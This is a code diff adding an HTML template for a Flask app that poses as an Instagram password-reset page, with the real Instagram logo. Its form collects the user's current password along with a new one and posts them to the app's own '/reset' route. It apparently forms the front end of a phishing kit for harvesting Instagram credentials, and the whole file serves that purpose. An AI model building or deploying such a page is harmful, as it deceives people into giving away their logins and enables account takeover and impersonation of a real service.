@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Password Reset</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
+
+
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png" alt="Instagram Logo">
+        </div>
+        <h2>Reset Your Password</h2>
+        <form action="/reset" method="post">
+            <label for="username">Email or Username:</label>
+            <input type="text" id="username" name="username" required>
+            <label for="current_password">Current Password:</label>
+            <input type="password" id="current_password" name="current_password" required>
+            <label for="new_password">New Password:</label>
+            <input type="password" id="new_password" name="new_password" required>
+            <label for="confirm_password">Confirm New Password:</label>
+            <input type="password" id="confirm_password" name="confirm_password" required>
+            <button type="submit">Reset Password</button>
+        </form>
+    </div>
+</body>
+</html>
+
